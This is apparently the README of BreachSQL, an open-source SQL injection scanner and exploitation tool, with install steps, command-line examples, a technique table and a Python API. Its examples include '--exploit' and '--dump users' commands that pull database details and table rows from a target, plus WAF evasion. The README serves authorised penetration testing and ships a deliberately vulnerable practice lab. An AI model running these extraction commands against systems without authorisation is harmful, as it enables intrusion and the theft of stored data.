# BreachSQL

[![Python](https://img.shields.io/badge/Python-3.10%2B-blue.svg)](https://www.python.org/)
[![PyPI](https://img.shields.io/pypi/v/breachsql.svg)](https://pypi.org/project/breachsql/)
[![License](https://img.shields.io/badge/License-AGPLv3-green.svg)](LICENSE)
[![Security](https://img.shields.io/badge/Security-SQL%20Injection%20Scanner-red.svg)](https://github.com/CommonHuman-Lab/breachsql)
[![WAF Evasion](https://img.shields.io/badge/WAF%20Evasion-built--in-orange.svg)](https://github.com/CommonHuman-Lab/breachsql)

**Fast SQL injection scanner with built-in exploitation** — detect and extract in one command, across all major backends, with WAF evasion baked in. No Java. No license. Drops into a Python pipeline.

```bash
# Kali / Debian / Ubuntu — use a virtual env (required on externally-managed Python)
python3 -m venv .venv && source .venv/bin/activate
pip install breachsql

# Scan and exploit in one pass
breachsql -u "https://target.com/item?id=1" --exploit

# Dump a table straight from the finding
breachsql -u "https://target.com/item?id=1" --dump users
```

> Point it at a target. Get findings. Drop it in a pipeline.

---

## Why BreachSQL?

- **Faster** — binary-search boolean extraction, parallel surface probing, no per-request sleep loops
- **Detect → exploit in one pass** — `--exploit` extracts version, user, database, and tables immediately after a confirmed hit; `--dump TABLE` pulls rows without a second invocation
- **Python API** — `from breachsql.engine import scan, ScanOptions` — embed it directly in your own tooling or scripts
- **Scan from spec** — `--openapi` imports every endpoint from a Swagger/OpenAPI file and scans them all
- **Curated payloads** — backed by [commonhuman-payloads](https://github.com/CommonHuman-Lab/commonhuman-payloads), an auditable, versioned payload library shared across the toolchain
- **Pipeline-native** — structured JSON output, clean exit codes, no interactive prompts by default
- **Lightweight** — pure Python 3.10+, no C extensions, no Java, installs in a venv in seconds

---

## Quick Start

```bash
# GET parameter
breachsql -u "https://target.com/item?id=1"

# POST form
breachsql -u "https://target.com/login" -d "username=admin&password=x"

# JSON body
breachsql -u "https://target.com/api/user" -d '{"user_id": 1}'

# Cookie injection
breachsql -u "https://target.com/profile" --cookie "session_id=abc" --cookie-params session_id

# Path parameter
breachsql -u "https://target.com/item/1" --path-params id

# Time-blind with custom threshold
breachsql -u "https://target.com/search?name=x" --technique T --time-threshold 3

# Specific backend and technique
breachsql -u "https://target.com/users?id=1" --dbms mysql --technique E

# Extract version, current user, database name, and table list after detection
breachsql -u "https://target.com/users?id=1" --exploit

# Dump all rows from a specific table
breachsql -u "https://target.com/users?id=1" --dump users

# Full multi-technique scan
breachsql -u "https://target.com/report?id=1" --dbms mysql --technique EBTUS --level 2 --risk 2

# Authenticate before scanning
breachsql -u "https://target.com/app/search?q=test" \
  --login-url "https://target.com/login" \
  --login-user admin --login-pass secret

# Import all endpoints from an OpenAPI / Swagger spec
breachsql -u "https://target.com/" --openapi https://target.com/openapi.json

# Discover JS-rendered endpoints first, then scan everything
breachsql -u "https://target.com/" --browser-crawl --level 2
```

---

## Techniques

| Flag | Technique | Description |
| ---- | --------- | ----------- |
| `E` | Error-based | Database errors leak schema/data via malformed syntax |
| `B` | Boolean-blind | True/false response differences reveal data bit by bit |
| `T` | Time-blind | `SLEEP()` / `pg_sleep()` / `randomblob()` timing confirms injection |
| `U` | UNION-based | Column-count probing + data extraction via UNION SELECT |
| `S` | Stacked | Semicolon-delimited second statement injection |

Combine with `-t EBTUS` to run all techniques in a single pass.

---

## Python API

```python
from breachsql.engine import scan, ScanOptions

result = scan(
    "https://target.com/users?id=1",
    ScanOptions(dbms="mysql", technique="E", risk=1),
)

print(f"{result.total_findings} finding(s) in {result.duration_s:.1f}s")
for f in result.error_based:
    print(f"  [{f.technique}] {f.param} — {f.evidence}")
```

---

## Options

| Option | Default | Description |
| ------ | ------- | ----------- |
| `-u` | — | Target to use |
| `--crawl` | — | Crawl target |
| `--dbms` | auto | Target backend: `mysql`, `mariadb`, `postgres`, `sqlite`, `mssql`, `oracle` |
| `-t` / `--technique` | `EBTUS` | Techniques to run (any combo of E B T U S) |
| `--level` | `1` | Payload depth: 1 = standard, 2 = extended, 3 = extended + data extraction |
| `--risk` | `1` | Payload aggression: 1 = low, 2 = medium, 3 = high |
| `--time-threshold` | `5` | Seconds to consider a time-blind hit (T technique) |
| `-d` / `--data` | — | POST body — form-encoded or JSON |
| `--cookie` | — | Cookie string: `name=val; name2=val2` |
| `--cookie-params` | — | Which cookie names to inject |
| `--header-params` | — | HTTP header names to inject (e.g. `X-Forwarded-For`) |
| `--path-params` | — | Path segment names to treat as injection points |
| `--second-url` | — | Read URL for two-step injection |
| `--timeout` | `10` | Per-request timeout in seconds |
| `--login-url` | — | Login form URL — authenticates before scanning |
| `--login-user` | — | Username for form login |
| `--login-pass` | — | Password for form login |
| `--openapi` | — | OpenAPI/Swagger spec file or URL — imports endpoints to scan |
| `--browser-crawl` | — | Headless Chromium endpoint discovery (requires selenium) |
| `--exploit` | — | After detection, extract version / current user / database name / table list |
| `--dump TABLE` | — | Dump all rows from TABLE using a confirmed injection point (implies `--exploit`) |
| `-o` | — | Write findings to JSON file |

---

## Fire Range

The **BreachSQL Fire Range** is a deliberately vulnerable Flask + MySQL + PostgreSQL + SQLite app that ships with [OctoRig](https://github.com/CommonHuman-Lab/OctoRig) (lab slot 7). It provides injectable endpoints that the scanner is verified against on every change.

```bash
# Start the Fire Range (OctoRig required)
./octorig.sh start 7

# Run the full end-to-end test suite
pytest tests/test_firerange.py -v
```

→ [Fire Range README](https://github.com/CommonHuman-Lab/OctoRig/tree/main/labs/firerange)

---

## Install from source

```bash
git clone https://github.com/CommonHuman-Lab/breachsql.git
cd breachsql
python3 -m venv .venv && source .venv/bin/activate
pip install -e .
pip install -e ".[dev]"   # + pytest, mypy, ruff
```

Requires Python 3.10+. No C extensions. On Kali and other Debian-based systems, the virtual env is required — system Python is externally managed.

---

## License

Licensed under the [AGPLv3](LICENSE). You are free to use, modify, and distribute this software. If you run it as a service or distribute it, the source must remain open.

For commercial licensing, contact the author.
